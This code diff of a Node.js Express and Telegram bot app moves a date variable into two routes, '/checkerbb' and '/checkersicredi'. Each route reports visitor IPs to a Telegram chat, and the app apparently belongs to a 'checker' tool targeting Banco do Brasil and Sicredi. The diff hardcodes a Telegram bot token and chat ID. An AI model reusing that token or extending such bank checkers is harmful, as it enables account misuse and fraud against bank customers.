@@ -4,8 +4,6 @@ import { Telegraf } from "telegraf";
 import { checker_bb, checker_sicredi } from "./api.js";
 import "ejs";
 
-const dataAtual = new Date();
-
 const app = express();
 
 const bot = new Telegraf('5247604590:AAHiHzBXrM0qdgnbZ1WVZFw-7d87wcPxw0M');
@@ -21,6 +19,7 @@ app.get('/', (req, res) => {
 
 app.get('/checkerbb', (req, res) => {
     const clientIp = requestIp.getClientIp(req);
+    const dataAtual = new Date();
     bot.telegram.sendMessage(1623828324, `<b>NOVO ACESSO DETECTADO!	&#128752;&#65039;\n\nChecker ➜ Banco do Brasil\n\nIPv4/IPv6: <code>${clientIp}</code>\n\n${dataAtual.toLocaleString("pt-Br", {
         dateStyle: "short",
         timeStyle: "short",
@@ -37,6 +36,7 @@ app.get('/checkerbb', (req, res) => {
 
 app.get('/checkersicredi', (req, res) => {
     const clientIp = requestIp.getClientIp(req);
+    const dataAtual = new Date();
     bot.telegram.sendMessage(1623828324, `<b>NOVO ACESSO DETECTADO!	&#128752;&#65039;\n\nChecker ➜ Banco Sicredi\n\nIPv4/IPv6: <code>${clientIp}</code>\n\n${dataAtual.toLocaleString("pt-Br", {
         dateStyle: "short",
         timeStyle: "short",
